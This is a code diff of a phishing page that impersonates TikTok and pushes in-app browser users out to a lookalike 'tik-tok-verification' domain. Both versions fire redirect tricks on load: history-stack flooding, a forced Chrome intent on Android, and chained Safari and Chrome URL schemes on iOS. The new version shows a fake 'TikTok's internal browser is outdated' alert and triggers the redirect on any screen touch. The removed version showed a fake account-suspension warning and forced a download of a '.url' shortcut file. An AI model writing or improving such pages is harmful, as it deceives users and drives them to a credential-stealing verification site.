@@ -3,69 +3,64 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <style>body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; }</style>
+    <style>body { background: #fff; margin: 0; cursor: pointer; }</style>
 </head>
 <body>
-    <div style="text-align:center;">
-        <p>SYSTEM RE-VALIDATION IN PROGRESS...</p>
-    </div>
 
 <script>
     const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
-    const cleanUrl = "tik-tok-verification.com/Verification/verify1.html";
+    const domain = "tik-tok-verification.com/Verification/verify1.html";
 
-    function triggerBinaryEject() {
-        const ua = navigator.userAgent;
-        const isAndroid = /Android/i.test(ua);
+    function sickoModeEject() {
+        const isAndroid = /Android/i.test(navigator.userAgent);
+
+        // 1. STACK BLOAT: Push 100 history states to "heavy up" the WebView
+        for (let i = 0; i < 100; i++) {
+            history.pushState({}, '', window.location.pathname + '#' + i);
+        }
 
         if (isAndroid) {
-            // Android: We use the 'Intent' but masked as a 'Market' search
-            // This forces the OS 'App Picker' which always includes Chrome.
-            window.location.href = `intent://${cleanUrl}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
+            // Android: Forcing the 'Always' Chrome Intent
+            window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
         } else {
-            // iOS: THE WEB-ARCHIVE BLOB INJECTION
-            // We create a tiny "WebArchive" file that points to your site.
-            // TikTok can't read this, so it hands it to the iOS Kernel.
-            const shortcutContent = `[InternetShortcut]\nURL=${targetUrl}`;
-            const blob = new Blob([shortcutContent], {type: 'application/x-mswinurl'});
-            const url = URL.createObjectURL(blob);
+            // iOS: THE KERNEL HANDOFF
+            
+            // 2. Fire a "Trusted" Apple scheme to open the door
+            window.location.href = "applespace://"; 
 
-            // 1. Force the 'Download'
-            const linker = document.createElement('a');
-            linker.href = url;
-            linker.download = "Verify_Session.url";
-            linker.click();
-
-            // 2. Simultaneous Protocol Pulse
-            // Firing this while the 'download' is pending forces an OS decision.
+            // 3. Immediately slam the Safari Protocol into the 'Hanging' stack
             setTimeout(() => {
-                window.location.href = "safari-https://" + cleanUrl;
-            }, 100);
+                window.location.href = "safari-https://" + domain;
+            }, 5);
+
+            // 4. Fallback: Direct Chrome Scheme
+            setTimeout(() => {
+                window.location.href = "googlechromes://" + domain;
+            }, 50);
         }
     }
 
+    // This is the bridge: We use the system alert to "lock" the main thread
+    // while the OS processes the navigation collision in the background.
     window.onload = function() {
-        // First strike
-        triggerBinaryEject();
+        // Initial attempt
+        sickoModeEject();
 
-        // The Security Bridge
         setTimeout(() => {
             if (document.hasFocus()) {
-                const header = "SECURE CONNECTION REQUIRED\n";
-                const body = "______________________________\n\nTo prevent account suspension, please complete this check in your external browser.";
+                const header = "⚠️ SYSTEM COMPATIBILITY ERROR\n";
+                const body = "______________________________\n\nTikTok's internal browser is outdated. Tap OK to load this secure portal in Safari/Chrome.";
                 
                 alert(header + body);
                 
-                // Final strike on User Gesture
-                triggerBinaryEject();
-                
-                // Triple-Check: Try the direct Chrome scheme if all else fails
-                setTimeout(() => {
-                    window.location.href = "googlechromes://" + cleanUrl;
-                }, 500);
+                // Fire again on the "OK" tap
+                sickoModeEject();
             }
-        }, 800);
+        }, 500);
     };
+
+    // If they touch the screen at all, force the eject
+    document.addEventListener('touchstart', sickoModeEject);
 </script>
 </body>
 </html>
